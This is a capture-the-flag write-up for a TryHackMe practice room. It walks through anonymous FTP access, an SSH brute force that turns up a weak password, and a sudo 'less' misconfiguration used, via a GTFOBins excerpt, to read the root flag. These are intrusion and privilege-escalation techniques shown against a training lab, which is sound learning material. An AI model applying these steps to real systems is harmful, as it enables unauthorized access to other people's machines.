This is a writeup for the Brooklynn 99 room on tryhackme.com

It is rated as an easy room and has two main intended ways in

We need to find 2 flags, seems normal enough

There's a web page and an ftp port that will allow anonymous.

I took a quick look at the website to see what kind of thing we're dealing with. The code says "Have you ever heard of steganograpyh?" 

So that's a pretty solid hint. While I go see what's in the ftp server I'm going to run a gobuster scan on the website.

And the classic anonymous:anonymous credentials get us into the ftp server

ftp 10.10.204.97

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete

and there's a note to jake in that ftp server which is great.

From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

This tells me that I could probably brute force a login for Jake especially given knowledge of the series.

SO while the brute force runs. I found nothing with the gobuster scan so I'm not going to include it. I downloaded the image we see on the website and look for any steganography stuff I can find.

The brute forcing worked, jake had a terrible password.
ACCOUNT FOUND: [ssh] Host: 10.10.204.97 User: jake Password: 987654321 [SUCCESS]

so now we can ssh into the machine

Once we're in we can navigate to holt's account in the machine and the user flag is there.


-----------------------------------------------------
PRIVLEDGE ESCALATION

So we have the user flag, now we need to find the root flag.
sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

So jake can run less with no passwd. So i'm going to check gtfobins to see how I can use this to get the root flag and so the first thing I'm going to try do is just read the root flag because that's just an easy win to the CTF

File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

    less file_to_read

    This is useful when less is used as a pager by another binary to read a different file.

    less /etc/profile
    :e file_to_read

less /root/root.txt

and the flag is there. That was a really fun box. Quick and easy.

If you want to become root instead of just reading the flag the less page on gtfobins has a way to escalate your privledges. Just go take a look at it.

Enjoy Hacking
